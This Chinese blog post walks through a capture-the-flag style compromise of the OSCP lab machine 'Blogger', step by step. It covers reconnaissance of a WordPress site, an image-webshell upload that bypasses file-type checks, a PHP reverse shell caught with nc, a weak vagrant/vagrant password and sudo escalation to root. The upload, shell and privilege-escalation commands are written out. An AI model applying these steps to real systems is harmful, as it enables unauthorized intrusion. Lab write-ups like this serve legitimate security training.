# 原创
：  从WEB到内网&&文件上传&&内网弱口令&&sudo提权 ------- 打靶经验分享

# 从WEB到内网&amp;&amp;文件上传&amp;&amp;内网弱口令&amp;&amp;sudo提权 ------- 打靶经验分享

OSCP靶机-------Blogger<br/> 今天来打一个OSCP的靶机，难度偏高，包含了端口探测，服务探测，ssh弱口令，CMS识别，文件上传绕过，nc反弹shell，sudo提权等等…靶场难度中等偏高，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家看完可以有所收获。

### 启动环境

启动VPN：openvpn universal.ovpn<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3c382df24039441980d36576077d1f6e.png"/><br/> 攻击机IP为：192.168.45.181<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3d405f622cca4509b103e652f21824e9.png"/><br/> 目标靶机IP为： 192.168.187.217

### 信息收集

**1.端口**<br/> nmap扫描端口<br/> `nmap --min-rate 10000 -p- 192.168.187.217`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/482a0eb4e63a427d8f453b829c980067.png"/><br/> 只有22,80两个端口<br/> 22-ssh 80-http<br/> **2.端口测试**<br/> **2.1** 22-ssh<br/> 手工弱口令登一下试试。<br/> `ssh root@192.168.187.217 -p 22`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8eee0dd9b49f4851bc8d4533ae203dd4.png"/><br/> ssh公钥有问题，无法继续。那么想用hydra爆破也就行不通了。<br/> **2.1** 80-http<br/> 访问192.168.187.217:80<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ac5957a072b14e44baf9081e73ba064d.png"/><br/> 看上去很精致，应该黑丝有cms，直接查一下。<br/> `whatweb http://192.168.187.217:80 `<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/56216dfc0b224083baccd94bb58270df.png"/><br/> 匪夷所思，是blogger么？msf搜一下。<br/> `msfconsole`<br/> `searchsploit Blogger`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/89bac64f25c34bdda4d60060e39963e4.png"/><br/> 没有。换思路，看一下源码：<br/> `curl http://192.168.187.217:80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ed4a7c3070c5437c900b8328c3861229.png"/><br/> 没什么有用的信息。那就dirsearch扫一下目录。<br/> `dirsearch -u http://192.168.187.217`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/87caed7d6b6b47ac8925cce2545fbb75.png"/><br/> 看一下assets。<br/> 访问192.168.187.217:80/assets<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/25bb067ce3924a95b5ceda1d6aa4f28e.png"/><br/> 是一个目录遍历。就是这个网站的一些css、js、fonts图标等等。<br/> 不过在fonts中有一个blog文件。看上去在记录owasp top10。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b89af2034d3e41a6902ce27c7542641c.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e63464d176a54235baf9fba6521c377e.png"/><br/> 随便点点，发现会跳转到一个域名blogger.thm。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d56d5bdee0b2441694aaa1cc127899fb.png"/><br/> 看上去要绑定hosts:<br/> `vim /etc/hosts`<br/> 然后在最后加上<br/> `192.168.187.217 blogger.thm`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f3f28a4ee59443b398af8886cff98c9b.png"/><br/> 再次访问刚才的blog站点。正常咯。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f5cb037bcb7e4ec2b70e8efe34fb0522.png"/><br/> 看一下cms：<br/> `whatweb http://blogger.thm/assets/fonts/blog/`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/48d6e2427ac4485e9a51adc92a5dc34b.png"/><br/> cms是WordPress 4.9.8，搜一下exp看看。<br/> `msfconsole`<br/> `searchsploit WordPress 4.9.8`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/49b38fe3c53442bc849b4edd4be937d5.png"/><br/> 全是插件，也没有rce，wp老漏洞大户了，肯定有专门的wp扫描：wpscan<br/> kali里就有，直接用：<br/> `wpscan --url http://blogger.thm/assets/fonts/blog/`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/fe5ddc15983f4e7db9fbc1e74df88214.png"/><br/> 出洞了，http://blogger.thm/assets/fonts/blog/wp-content/uploads/有文件上传。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/28a6f36a0c764918866a476de4d015d2.png"/><br/> 还是文件遍历，找不到什么随便点点。发现一个php<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/42bb9c9c0d274716b99d0c1ef0fd0cca.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f0f3cf5e54fb4712bcf27b4fe3ae7736.png"/><br/> 点进去发现了gif的文件头。应该网站里是有一个上传图片的地方。慢慢找一下。在wp的页面，owasp top10中有上传图片的地方。<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2d31ef9bd0144eff942d2f3a7e4232aa.png"/><br/> 这应该是wordpress的组件，源代码定位一下。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/58ba6b7460be475891b23e1697f24b2f.png"/><br/> 调用的wpdiscuz的组件，抓一下网络的包。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/70f2a65270084cbba73b40f693d2f246.png"/><br/> 现在确认了版本信息：wpdiscuz 7.0.4<br/> msf搜索exp<br/> `msfconsole`<br/> `searchsploit wpdiscuz 7.0.4`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3dd26253289e4afb891696f94de6f7ab.png"/><br/> search wpdiscuz 7.0.1<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8c3456e364884f7c94ba4e2a7a236cc0.png"/><br/> use 0<br/> show options<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0d8e3e86ce754c8d8c3cfc73e46ef5e5.png"/><br/> set lhost 192.168.45.181<br/> set rhosts 192.168.187.217<br/> set blogpath /assets/fonts/blog/?p=29<br/> run<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7145e186da1744f388bed5332dd66978.png"/><br/> 失败。。。。回去试试手工文件上传。<br/> 经过测试只能上传gif文件，先制作一个图片马。<br/> copy 1.jpg/a +shell.php/b shell.jpg<br/> 1.jpg为正常的图片，尽可能选择小点的图片，shell.php 为 php一句话木马。<br/> 准备上传，打开burpsuite，抓包改一下文件头看能否上传。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bcb19701cda5498cb5448cf2338f94b5.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/041ec66761c0436292e546704102faa8.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/671cb1c99f884a8bb1dff9f2266bcfa8.png"/><br/> 可以看到上传的位置，直接蚁剑链接。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/157f1bfd113a4a5b9293639159056735.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/526b41d6beff4f2bab5b5e205664446d.png"/><br/> 有shell了！

### 内网渗透

利用python获取交互shell<br/> `python -c "import pty;pty.spawn('/bin/bash')";`<br/> 获取flag:<br/> `find / -name local.txt 2&gt;/dev/null`<br/> `cat /home/james/local.txt`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4371465c2d9749fa9303bda279b78a1a.png"/>

### 提权

1.sudo提权<br/> `sudo -l`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/373b0a273d5f4fd385a748543968b290.png"/><br/> 2.suid提权<br/> `find / -perm -u=s -type f 2&gt;/dev/null`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/84b0081fa3634274a455f73fa11d4072.png"/><br/> 没合适的。<br/> 3.suid-getcap提权<br/> `/usr/sbin/getcap -r / 2&gt;/dev/null`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c1ae0590099b4eceb461b79abcf680e8.png"/><br/> 4.Cron job提权<br/> `cat /etc/crontab`<br/> 查找定时任务。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2ad525d1895f42548bdf2d0c9f973e54.png"/><br/> 5.内核overlayfs提权<br/> `lsb_release -a` 看看发行版本<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f6316ed8c551463a94eb4a377765d7d6.png"/><br/> Ubuntu 16.04.7 LTS 符合<br/> `uname -a`看看内核版本<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0a17ddc766e74ab7aa03c7ec16d93b2c.png"/><br/> 内核版本 4.4.0-206 不符合

### 内网信息收集

看一下用户：<br/> `ls -al /home`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4055eab289414f978cfa81b064b6e834.png"/><br/> 看一下是否有隐藏文件<br/> `ls -al /home/james`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bc5f479892b34f42882b8a9acebb6b7c.png"/><br/> 内网用户密码弱口令爆破，vagrant/vagrant成功了<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a9bc119a32b24d5e921e1595dca29101.png"/><br/> 但蚁剑好像不太对劲。<br/> 这蚁剑的一句话shell就不太行啊，重新拿shell。用kali的webshell：<br/> cp一个出来<br/> `sudo cp /usr/share/webshells/php/php-reverse-shell.php exp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/566e1a0a899f4cc889450b371c76f31d.png"/>

改后缀。<br/> `cp php-reverse-shell.php ./shell.jpg`<br/> 修改监听ip和端口：<br/> `vim php-reverse-shell.php`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c1b3957b06884f6eb4cc8fab8a6ad949.png"/><br/> nc开启监听：<br/> `nc -lvvp 1234`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c46fe49a4cd340bdb1bc084780d05de6.png"/><br/> 上传该文件，burpsuite抓包修改GIF89a头。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/41aa3c8361324964a383876c98a4c94d.png"/>

访问地址之后成功getwebshell<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0e1fb1dba8404f93be00b9aa1104d6dd.png"/>

### 二次提权

重复之前的操作，vagrant弱口令登录。<br/> 1.sudo提权<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/496828ebaacf4420bdb143ca503d54da.png"/><br/> 存在(ALL) NOPASSWD: ALL<br/> su提权<br/> `sudo su`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1faeb65af3ba4b989815a652dad31595.png"/><br/> 成功提权<br/> 获取flag2：`cat /root/proof.txt`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ea83a1b2d7514df2b379f1b1fafd5311.png"/>
